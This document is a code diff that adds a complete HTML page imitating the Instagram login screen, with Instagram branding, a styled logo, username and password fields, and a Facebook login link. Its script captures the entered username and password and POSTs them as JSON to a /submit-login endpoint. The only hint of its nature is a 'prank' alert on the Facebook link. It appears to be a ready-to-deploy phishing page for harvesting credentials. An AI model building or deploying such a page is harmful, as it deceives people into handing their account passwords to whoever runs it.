@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <!-- Pacifico font for Instagram logo -->
+  <link href="https://fonts.googleapis.com/css2?family=Pacifico&display=swap" rel="stylesheet">
+  <style>
+    body {
+      background: #fafafa;
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+    .main-wrapper {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      width: 100%;
+    }
+    .login-container {
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 40px 40px 32px 40px;
+      width: 350px;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.06);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+    .instagram-logo {
+      font-family: 'Pacifico', cursive;
+      font-size: 2.7em;
+      color: #262626;
+      letter-spacing: 1px;
+      margin-bottom: 30px;
+      margin-top: 0;
+      user-select: none;
+    }
+    .login-form {
+      width: 100%;
+      display: flex;
+      flex-direction: column;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .login-form input {
+      padding: 10px;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      background: #fafafa;
+      font-size: 1em;
+      outline: none;
+    }
+    .login-form button {
+      background: #385185;
+      color: #fff;
+      border: none;
+      padding: 10px 0;
+      border-radius: 5px;
+      font-size: 1em;
+      font-weight: bold;
+      cursor: pointer;
+      margin-top: 8px;
+      margin-bottom: 6px;
+      transition: background 0.2s;
+    }
+    .login-form button:hover {
+      background: #2e4372;
+    }
+    .divider {
+      display: flex;
+      align-items: center;
+      width: 100%;
+      margin: 18px 0 16px 0;
+    }
+    .divider-line {
+      flex: 1;
+      height: 1px;
+      background: #dbdbdb;
+    }
+    .divider-text {
+      margin: 0 18px;
+      color: #8e8e8e;
+      font-weight: bold;
+      font-size: .95em;
+    }
+    .facebook-login {
+      color: #385185;
+      font-weight: bold;
+      text-decoration: none;
+      display: flex;
+      align-items: center;
+      margin-bottom: 10px;
+      font-size: 1em;
+      justify-content: center;
+      gap: 7px;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .facebook-login:hover {
+      color: #2e4372;
+    }
+    .facebook-login img {
+      width: 20px;
+      height: 20px;
+      vertical-align: middle;
+    }
+    .forgot {
+      color: #00376b;
+      font-size: 0.95em;
+      text-decoration: none;
+      margin-bottom: 12px;
+      display: block;
+      text-align: center;
+      cursor: pointer;
+      transition: color 0.2s;
+    }
+    .forgot:hover {
+      color: #385185;
+    }
+    .signup-section {
+      margin-top: 28px;
+      text-align: center;
+      font-size: 1em;
+      color: #262626;
+      background: #fff;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      padding: 20px;
+      width: 350px;
+    }
+    .signup-section a {
+      color: #0095f6;
+      font-weight: bold;
+      text-decoration: none;
+      margin-left: 2px;
+      transition: color 0.2s;
+    }
+    .signup-section a:hover {
+      color: #00376b;
+    }
+  </style>
+</head>
+<body>
+  <div class="main-wrapper">
+    <div class="login-container">
+      <div class="instagram-logo">Instagram</div>
+      <form class="login-form" id="loginForm">
+        <input type="text" placeholder="Phone number, username, or email" id="username" required autocomplete="username">
+        <input type="password" placeholder="Password" id="password" required autocomplete="current-password">
+        <button type="submit">Log in</button>
+      </form>
+      <div class="divider">
+        <div class="divider-line"></div>
+        <div class="divider-text">OR</div>
+        <div class="divider-line"></div>
+      </div>
+      <div class="facebook-login" onclick="alert('This is a prank!')">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" alt="Facebook logo">
+        Log in with Facebook
+      </div>
+      <a href="#" class="forgot">Forgot password?</a>
+    </div>
+    <div class="signup-section">
+      Don't have an account?<a href="#">Sign up</a>
+    </div>
+  </div>
+  <script>
+    document.getElementById('loginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+      fetch('/submit-login', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      })
+      .then(res => res.json())
+      .then(data => {
+        alert('Login submitted!');
+        event.target.reset();
+      });
+    });
+  </script>
+</body>
+</html>
